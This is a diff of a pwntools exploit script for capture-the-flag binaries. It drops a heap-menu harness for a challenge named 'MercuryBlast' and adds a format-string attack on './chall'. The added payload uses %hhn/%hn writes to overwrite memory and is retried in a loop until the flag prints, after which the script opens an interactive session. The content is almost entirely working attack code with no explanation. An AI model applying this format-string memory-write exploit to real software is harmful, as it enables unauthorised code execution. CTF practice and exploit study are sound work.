@@ -1,5 +1,3 @@
-#!/usr/bin/env python2
-# -*- coding: utf-8 -*
 import re
 import os
 from pwn import *
@@ -23,58 +21,30 @@ def debug(breakpoint=''):
     gdbscript += 'directory %sstdlib/\n' % glibc_dir
     gdbscript += 'directory %slibio/\n' % glibc_dir
     gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set follow-fork-mode parent\n'
-    gdbscript += 'set resolve-heap-via-heuristic on\n'
+    gdbscript += 'set follow-fork-mode child\n'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
-elf = ELF("./MercuryBlast")
-libc = ELF("./libc-2.31.so")
-context(arch = elf.arch ,log_level = 'debug', os = 'linux')
 
-def add_record(temp, size, data):
-    sla("Your choice: ", "1")
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
-
-def print_record():
-    sla("Your choice: ", "2")
-    # sla("Input Index:", str(idx))
-
-def delete_record(idx):
-    sla("Your choice: ", "3")
-    sla("Input Index:", str(idx))   
-
-def edit_record(idx, temp, size, data):
-    sla("Your choice: ", "4")
-    sla("Input index: ", str(idx))
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
-
-def blast(data):
-    sla("Your choice: ", str('\x7f'))
-    se(data)
-
-read_bp = 0x167a
-
-def exp1():
-    add_record(1, 0x200, b'AAAAAAAA')
-    debug('''
-    b * delete_record
-    b * delete_record+63
-    ''')
-    delete_record(0)
-    p.interactive()
+elf = ELF("./chall")
+context(arch = elf.arch , os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
 
 
-def exp2():
-    p.interactive()
+payload = flat({
+    48 : b'%c%c%c%c%c%c%66c%hhn%21615c%22$hn'
+})
 
-    
-p = process("./MercuryBlast")
-exp1()
-# exp2()
+while True:
+    try: 
+        p = elf.process()
+        #debug(0x1399)
+        sla("re you ready? ", payload)
+        p.recvuntil(b'The flag is ')
+        p.interactive()
+        break
+    except KeyboardInterrupt:
+        break
+    except EOFError:
+        p.close()
